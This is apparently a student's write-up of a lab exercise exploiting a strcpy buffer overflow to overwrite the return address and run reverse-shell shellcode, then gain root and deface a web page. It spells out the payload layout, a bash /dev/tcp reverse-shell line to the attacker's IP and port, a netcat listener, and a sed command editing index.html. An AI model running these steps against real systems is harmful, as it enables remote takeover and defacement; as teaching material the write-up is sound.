In this run, MY_IP is "129.104.230.166" and MY_PORT is 5555. Besides, I opened my port for tcp on port 5555 (on my own iptables).

We use a buffer overrun : "buf", which is 256 bytes long, is copied via strcpy into "greeting_text", only 128 bytes long.
We can thus override the %rip register with the adress of "buf", to execute the payload stored at this address.

The format of the string copied into buffer is :

buf : payload + 'AAAAAAA' + buf adress + NULL-byte
	   (118)       (22)        (6)          (1)      < 256 bytes

No need of NOP-slide in this exercise.
The opcode was taken from a quick google search "tcp remote shell opcode". Here is the link of the one used, and modified http://shell-storm.org/shellcode/files/shellcode-857.php

It basically corresponds to a syscall of : bash -i >& /dev/tcp/MY_IP/MY_PORT 0>&1 


By launching  >nc MY_IP MY_PORT -lnv, we thus have a remote shell with root privileges, and it is then easy to modify the website.

I used this command to modify the website in one go :

>sed -i 's/<\/body>/\r\nNAME\r\n<\/body>/' /var/www/html/index.html

Which appends the name NAME exactly in the right place.
